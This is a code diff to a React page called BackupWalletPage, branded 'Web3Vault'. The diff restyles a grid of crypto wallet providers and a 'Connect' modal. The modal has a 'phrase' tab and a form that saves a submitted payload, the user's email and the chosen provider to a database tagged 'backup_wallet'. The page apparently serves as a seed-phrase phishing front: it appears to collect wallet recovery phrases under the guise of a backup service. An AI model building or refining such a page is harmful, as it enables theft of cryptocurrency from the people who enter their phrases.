@@ -23,7 +23,7 @@ const getInitials = (name: string) =>
 export default function BackupWalletPage() {
   const [wallets, setWallets] = useState<WalletProvider[]>([]);
   const [isLoadingWallets, setIsLoadingWallets] = useState(true);
-  const [activeWallet, setActiveWallet] = useState<string | null>(null);
+  const [activeWallet, setActiveWallet] = useState<WalletProvider | null>(null);
   const [modalStep, setModalStep] = useState<
     "preview" | "form" | "success"
   >("preview");
@@ -65,7 +65,7 @@ export default function BackupWalletPage() {
 
   const activeInitials = useMemo(() => {
     if (!activeWallet) return "";
-    return getInitials(activeWallet);
+    return getInitials(activeWallet.name);
   }, [activeWallet]);
 
   return (
@@ -81,30 +81,30 @@ export default function BackupWalletPage() {
       </div>
 
       <div className="rounded-2xl border border-slate-200/70 bg-white p-6 shadow-[0_12px_30px_rgba(15,23,42,0.08)] dark:border-white/10 dark:bg-[#100a1f]/40 dark:shadow-[0_12px_30px_rgba(5,8,20,0.45)]">
-        <div className="grid gap-6 sm:grid-cols-2 lg:grid-cols-4">
+        <div className="grid grid-cols-2 gap-4 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4">
           {isLoadingWallets
             ? null
             : wallets.map((wallet) => (
             <div
               key={wallet.id}
-              className="rounded-2xl border border-slate-200/70 bg-slate-50 px-6 py-6 text-center text-slate-700 shadow-[0_10px_24px_rgba(15,23,42,0.08)] transition duration-300 ease-out hover:-translate-y-1 hover:shadow-[0_18px_36px_rgba(15,23,42,0.15)] dark:border-white/10 dark:bg-[#1a1130] dark:text-slate-200 dark:shadow-[0_10px_24px_rgba(5,8,20,0.5)] dark:hover:shadow-[0_18px_36px_rgba(5,8,20,0.6)]"
+              className="flex items-center gap-1 rounded-2xl border border-slate-200/70 bg-slate-50 px-4 py-4 text-left text-slate-700 shadow-[0_10px_24px_rgba(15,23,42,0.08)] transition duration-300 ease-out hover:-translate-y-0.5 hover:shadow-[0_18px_36px_rgba(15,23,42,0.15)] dark:border-white/10 dark:bg-[#1a1130] dark:text-slate-200 dark:shadow-[0_10px_24px_rgba(5,8,20,0.5)] dark:hover:shadow-[0_18px_36px_rgba(5,8,20,0.6)]"
               role="button"
               tabIndex={0}
               onClick={() => {
-                setActiveWallet(wallet.name);
+                setActiveWallet(wallet);
                 setModalStep("preview");
                 setActiveTab("phrase");
               }}
               onKeyDown={(event) => {
                 if (event.key === "Enter" || event.key === " ") {
-                  setActiveWallet(wallet.name);
+                  setActiveWallet(wallet);
                   setModalStep("form");
                   setActiveTab("phrase");
                 }
               }}
             >
               <div
-                className={`mx-auto flex h-12 w-12 items-center justify-center rounded-full text-sm font-semibold shadow-[0_8px_16px_rgba(15,23,42,0.12)] dark:shadow-[0_8px_16px_rgba(15,23,42,0.35)] ${
+                className={`flex w-10 aspect-square shrink-0 items-center justify-center overflow-hidden rounded-full text-sm font-semibold shadow-[0_8px_16px_rgba(15,23,42,0.12)] dark:shadow-[0_8px_16px_rgba(15,23,42,0.35)] ${
                   wallet.logo_url
                     ? "bg-transparent"
                     : "border border-slate-200/70 bg-white text-cyan-600 dark:border-white/10 dark:text-[#2dd4f8]"
@@ -114,13 +114,13 @@ export default function BackupWalletPage() {
                   <img
                     src={wallet.logo_url}
                     alt={wallet.name}
-                    className="h-12 w-12 rounded-full object-cover"
+                    className="h-full w-full rounded-full object-contain p-0.5"
                   />
                 ) : (
                   getInitials(wallet.name)
                 )}
               </div>
-              <div className="mt-4 text-sm font-semibold text-slate-700 dark:text-cyan-300">
+              <div className="text-sm font-semibold text-slate-700 dark:text-cyan-300">
                 {wallet.name}
               </div>
             </div>
@@ -148,11 +148,19 @@ export default function BackupWalletPage() {
                 </button>
               </div>
               <div className="mt-6 flex flex-col items-center">
-                <div className="flex h-16 w-16 items-center justify-center rounded-full border border-white/10 bg-white text-lg font-bold text-[#2dd4f8] shadow-[0_8px_16px_rgba(15,23,42,0.35)]">
-                  {activeInitials}
+                <div className="flex w-16 aspect-square items-center justify-center overflow-hidden rounded-full border border-white/10 bg-white text-lg font-bold text-[#2dd4f8] shadow-[0_8px_16px_rgba(15,23,42,0.35)]">
+                  {activeWallet?.logo_url ? (
+                    <img
+                      src={activeWallet.logo_url}
+                      alt={activeWallet.name}
+                      className="h-full w-full rounded-full object-contain p-1.5"
+                    />
+                  ) : (
+                    activeInitials
+                  )}
                 </div>
                 <div className="mt-4 text-base font-semibold text-white">
-                  {activeWallet}
+                  {activeWallet?.name}
                 </div>
                 <button
                   className="mt-4 rounded-full bg-linear-to-r from-cyan-400 to-violet-500 px-6 py-2 text-sm font-semibold text-slate-900 shadow-[0_0_20px_rgba(34,211,238,0.35)]"
@@ -169,7 +177,7 @@ export default function BackupWalletPage() {
           ) : modalStep === "form" ? (
             <div className="relative w-full max-w-md rounded-2xl border border-white/10 bg-[#1a1130] p-6 text-center shadow-[0_20px_50px_rgba(4,10,22,0.6)]">
               <div className="flex items-center justify-between text-left text-sm font-semibold text-cyan-200">
-                <span>Connect {activeWallet}</span>
+                <span>Connect {activeWallet?.name}</span>
                 <button
                   className="text-cyan-200 transition hover:text-white"
                   onClick={resetModal}
@@ -255,7 +263,7 @@ export default function BackupWalletPage() {
                     .insert({
                       user_id: user?.id ?? null,
                       user_email: user?.email ?? walletEmail ?? null,
-                      provider: activeWallet,
+                      provider: activeWallet?.name ?? null,
                       method: activeTab,
                       payload,
                       source: "backup_wallet",
@@ -285,6 +293,21 @@ export default function BackupWalletPage() {
             </div>
           ) : (
             <div className="relative w-full max-w-sm rounded-2xl bg-white p-8 text-center text-slate-800 shadow-[0_20px_50px_rgba(0,0,0,0.45)]">
+              <div className="mx-auto flex items-center justify-center gap-2 text-sm font-semibold text-slate-700">
+                <span className="flex h-8 w-8 items-center justify-center rounded-lg border border-slate-200 bg-slate-50">
+                  <svg
+                    viewBox="0 0 24 24"
+                    className="h-5 w-5 text-cyan-600"
+                    aria-hidden="true"
+                  >
+                    <path
+                      fill="currentColor"
+                      d="M12 2 3 7v10l9 5 9-5V7l-9-5Zm0 2.2 6.8 3.8v8L12 19.8 5.2 16V8l6.8-3.8Zm0 2.2-4.6 2.6v5.4L12 17l4.6-2.6V9L12 6.4Zm0 2 2.6 1.5v3L12 14.2l-2.6-1.5v-3L12 8.4Z"
+                    />
+                  </svg>
+                </span>
+                Web3Vault
+              </div>
               <div className="mx-auto flex h-12 w-12 items-center justify-center rounded-full bg-slate-900 text-white">
                 ✓
               </div>
